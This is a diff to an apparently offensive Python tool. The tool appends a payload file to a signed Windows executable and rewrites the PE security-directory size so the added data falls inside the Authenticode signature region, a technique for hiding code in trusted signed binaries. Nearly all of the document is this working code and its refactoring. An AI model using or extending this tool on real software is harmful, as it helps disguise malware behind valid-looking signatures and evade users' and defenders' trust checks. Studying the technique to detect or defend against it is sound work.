@@ -3,25 +3,30 @@ import argparse
 
 
 def merge_data_into_file(file_path, data_path, new_name):
-    print("[*] Parsing signed executable")
-    pe = pefile.PE(file_path)
+    print("[*] Reading signed input file")
+    ffd = open(file_path, 'rb')
+    file_content = ffd.read()
+    ffd.close()
+    print("[*] Reading payload content")
+    dfd = open(data_path, 'rb')
+    data_content = dfd.read()
+    dfd.close()
+    print("[*] Size of data to be written -", hex(len(data_content)))
+    print("[*] Merging data in memory")
+    new_content = file_content + data_content
+    padding = b"\x00" * (4 - len(data_content) % 4)
+    new_content += padding
+    pe = pefile.PE(data=new_content)
     data_directory = pe.OPTIONAL_HEADER.DATA_DIRECTORY
     entry_security = [d for d in data_directory if d.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY'][0]
     if entry_security.Size == 0:
         print("[*] No signature found in executable")
         print("[*] Exiting")
         return
-    print("[*] Reading data to be written")
-    data = open(data_path, 'rb')
-    data_content = data.read()
-    data_size = len(data_content)
-    print("[*] Size of data to be written -", hex(data_size))
-    new_signature_size = entry_security.Size + data_size
+    new_signature_size = entry_security.Size + len(data_content) + len(padding)
     print(f"[*] Changing signature size header from {hex(entry_security.Size)} to {hex(new_signature_size)}")
     print("[*] Old security directory:")
     print("\t", entry_security)
-    data_directory = pe.OPTIONAL_HEADER.DATA_DIRECTORY
-    entry_security = [d for d in data_directory if d.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY'][0]
     for d in data_directory:
         if d.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY':
             d.Size = new_signature_size
@@ -29,11 +34,7 @@ def merge_data_into_file(file_path, data_path, new_name):
     print("\t", entry_security)
     pe.write(new_name)
     pe.close()
-    print("[*] Writing data to file")
-    with open(new_name, 'ab') as f:
-        f.write(data_content)
-    data.close()
-    print("[*] Done")
+    print("[*] Finished")
 
 
 def main():
